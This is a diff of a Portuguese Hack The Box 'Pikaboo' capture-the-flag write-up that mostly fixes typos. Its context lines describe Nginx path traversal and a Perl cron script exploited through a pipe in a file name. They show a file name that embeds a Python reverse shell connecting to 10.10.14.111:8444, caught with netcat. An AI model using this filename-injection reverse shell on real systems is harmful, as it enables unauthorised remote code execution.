@@ -3,7 +3,7 @@ title: HTB Pikaboo Writeup
 author: Hastur
 date: 2021-09-19 10:00:00 -0300
 categories: [Writeups, Hack The Box]
-tags: [HTB, Linux, Hard, Web, Path Traversal, Cron, Perl Script Vuln]
+tags: [HTB, Linux, Hard, Web, Path Traversal, Cron, Perl Script Vuln, LFI]
 image: "/htb/htb-pikaboo-logo.png"
 ---
 
@@ -83,7 +83,7 @@ Vemos a resposta de `Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81`, porém
 
 Após um tempo de pesquisa sobre vulnerabilidades no Nginx, que é nossa porta de entrada, encontrei este [artigo](https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/).
 
-Basicamente podemos nos aproveitar do Nginx mal configurado para obtermos `Path traversal` ao adicionarmos `../` na URL e conseguirmos enumerar diretórios, vamos tentar.
+Basicamente podemos nos aproveitar do Nginx mal configurado para obtermos `Path Traversal` ao adicionarmos `../` na URL e conseguirmos enumerar diretórios, vamos tentar.
 
 ```
 ┌──(hastur㉿hastur)-[~/Pikaboo]
@@ -124,7 +124,7 @@ Encontramos algumas requisições recentes no servido Apache, entre elas, o `/ad
 
 Caímos em um dashboard com algumas informações sobre o desempenho da página.
 
-Eu enumerar a página, descobrimos que ao clicar em qualquer link, vemos um parâmetro `GET` na url.
+Ao enumerar a página, descobrimos que ao clicar em qualquer link, vemos um parâmetro `GET` na url.
 
 <img src="/htb/htb-pikaboo-9.png">
 
@@ -219,7 +219,7 @@ lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -> /dev/null
 -r--r----- 1 pwnmeow www-data     33 Sep 19 19:43 user.txt
 ```
 
-No diretório `/home` encontramos o usuário penmeow que já havimos enumerado no log do FTP, e também já podemos obter a flag `user.txt`
+No diretório `/home` encontramos o usuário pwnmeow que já havimos enumerado no log do FTP, e também já podemos obter a flag `user.txt`
 
 Durante a enumeração local, descobrimos que o servidor está rodando um `LDAP` na porta 389.
 
@@ -801,7 +801,7 @@ Ao ler o script, percebemos que ele basicamente faz suas alterações ao captar 
 
 O pesquisar sobre vulnerabilidades em scripts Perl, encontrei este [artigo](https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543).
 
-Basicamente ele diz que se o nome do arquivo tiver um pipe `"|"`, o resto do nome do arquivo seré executado como um comando, porém, a cron utiliza `basename`, então não podemos executar qualquer payload, se testarmos em nossa máquina local, veremos que o payload simples de reverse shell é cortado pelo basename.
+Basicamente ele diz que se o nome do arquivo tiver um pipe `"|"`, o resto do nome do arquivo será executado como um comando, porém, a cron utiliza `basename`, então não podemos executar qualquer payload, se testarmos em nossa máquina local, veremos que o payload simples de reverse shell é cortado pelo basename.
 
 ```
 ┌──(hastur㉿hastur)-[~/Pikaboo]
@@ -823,11 +823,10 @@ O basename vai considerar só o que vem após o último `"/"`, então precisamos
 total 8
 drwxr-xr-x  2 hastur hastur 4096 Sep 19 17:14  .
 drwxr-xr-x 36 hastur hastur 4096 Sep 19 15:42  ..
--rw-r--r--  1 hastur hastur    0 Sep 19 16:46  hastur
 -rw-r--r--  1 hastur hastur    0 Sep 19 17:14 '|python -c '\''import os,pty,socket;s=socket.socket();s.connect(("10.10.14.111",8444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'\'';.csv'
 ```
 
-O que precisamos fazer é setar um `netcat` na porta 8444 e enviar nossos arquivo para o diretório versions, que é onde temos permissão de escrita.
+O que precisamos fazer é setar um `netcat` na porta 8444 e enviar nosso arquivo para o diretório versions, que é onde temos permissão de escrita.
 
 ```
 ┌──(hastur㉿hastur)-[~/Pikaboo]
